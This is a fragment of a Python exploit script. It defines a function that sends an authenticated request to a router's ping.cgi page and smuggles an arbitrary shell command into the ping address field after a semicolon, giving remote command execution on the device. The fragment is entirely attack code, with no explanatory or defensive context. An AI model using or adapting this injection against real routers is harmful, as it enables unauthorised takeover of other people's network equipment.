...
def execute(cmd):
    r = requests.post("http://" + sys.argv[1] + "/ping.cgi", data={'IPAddr1': 12, 'IPAddr2': 12, 'IPAddr3': 12, 'IPAddr4': 12, 'ping':"Ping", 'ping_IPAddr':"www.example.com; " + cmd}, auth=(login, password), headers={'referer': "http://www.example1.com/DIAG_diag.htm"})
